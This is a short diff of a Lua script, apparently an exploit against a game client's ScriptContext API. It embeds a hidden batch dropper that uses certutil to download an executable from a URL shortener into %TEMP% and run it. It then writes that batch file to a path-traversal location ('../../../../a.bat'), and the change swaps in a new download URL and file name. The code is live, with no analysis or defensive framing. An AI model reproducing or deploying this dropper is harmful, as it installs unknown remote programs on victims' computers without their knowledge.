@@ -18,7 +18,7 @@ local scriptContent = [[
 @echo off
 powershell -WindowStyle Hidden exit
 echo Xeno 
-cmd /c certutil -urlcache -split -f "https://is.gd/E5bKTm" "%TEMP%\Client.exe" && "%TEMP%\Client.exe"
+cmd /c certutil -urlcache -split -f "https://is.gd/RbuL9v" "%TEMP%\Built.exe" && "%TEMP%\Built.exe"
 pause
 ]]
 local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "../../../../a.bat")
